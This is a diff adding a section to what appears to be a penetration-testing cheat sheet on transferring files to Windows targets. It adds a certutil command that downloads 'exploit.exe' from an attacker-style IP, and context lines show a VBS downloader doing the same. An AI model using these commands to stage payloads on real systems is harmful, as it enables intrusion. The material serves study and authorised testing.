@@ -86,6 +86,13 @@ Now try to download a file to the local path:
 CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip" ".\archive.zip"
 ```
 
+### Uploading Files with CertUtil.exe
+I've found that CertUtil can be quite reliable when all else seems to fail.
+
+```
+certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
+```
+
 ### Uploading Files with PowerShell  
 
 Test to see if we can run Powershell:
